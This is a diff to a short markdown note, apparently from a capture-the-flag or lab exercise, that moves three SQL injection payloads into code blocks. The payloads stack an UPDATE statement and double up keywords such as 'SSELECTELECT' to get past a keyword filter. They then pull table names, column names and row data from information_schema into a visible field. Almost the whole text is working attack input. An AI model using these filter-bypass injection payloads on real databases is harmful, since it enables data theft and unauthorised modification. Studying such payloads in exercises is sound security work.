@@ -25,14 +25,17 @@ SHOW TABLES;
 
 
 **GET TABLES**
--  1;UPDATE FOOD SET Name=concat((SSELECTELECT group_concat(table_name)FROM infoorrmation_schema.tables WHERE table_schema=database()));
+```1;UPDATE FOOD SET Name=concat((SSELECTELECT group_concat(table_name)FROM infoorrmation_schema.tables WHERE table_schema=database()));
+```
 
 **GET COLUMN NAMES**
--  1;UPDATE FOOD SET country=concat((SSELECTELECT group_concat(column_name) FROM infoorrmation_schema.columns WHERE table_name='KITCHEN TOOLS'));
+```1;UPDATE FOOD SET country=concat((SSELECTELECT group_concat(column_name) FROM infoorrmation_schema.columns WHERE table_name='KITCHEN TOOLS'));
+```
 
 **GET ROW DATA**
--  1;UPDATE FOOD SET country=concat((SSELECTELECT group_concat(Name, Tools) FROM KITCHEN TOOLS));
-
+```
+1;UPDATE FOOD SET country=concat((SSELECTELECT group_concat(Name, Tools) FROM KITCHEN TOOLS));
+```
 
 (*) -> wildcard selector (all fields / columns)
 (;) -> statement terminator
